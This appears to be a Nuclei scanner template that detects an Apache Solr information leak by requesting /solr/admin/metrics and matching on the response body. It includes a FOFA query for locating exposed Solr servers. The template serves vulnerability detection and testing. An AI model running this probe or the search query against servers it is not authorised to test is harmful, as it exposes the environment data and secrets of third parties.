id: apache-solar-webapp-infoleak

info:
  name: apache-solar-webapp-infoleak
  author: xxxx1xxxx
  severity: medium
  description: Apache Solr 环境变量信息泄漏漏洞
  tags: apache-solar,infoleak
  metadata:
    fofa-qeury: app="APACHE-Solr"
    veified: true
    max-request: 1

http:
  - raw:
      - |              
        GET /solr/admin/metrics HTTP/1.1
        Host: {{Host}}
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
               
    matchers:     
      - type: dsl
        name: infoleak
        dsl:
          - "status_code_1 == 200 && contains(body,'responseHeader') && contains(body,'metrics')"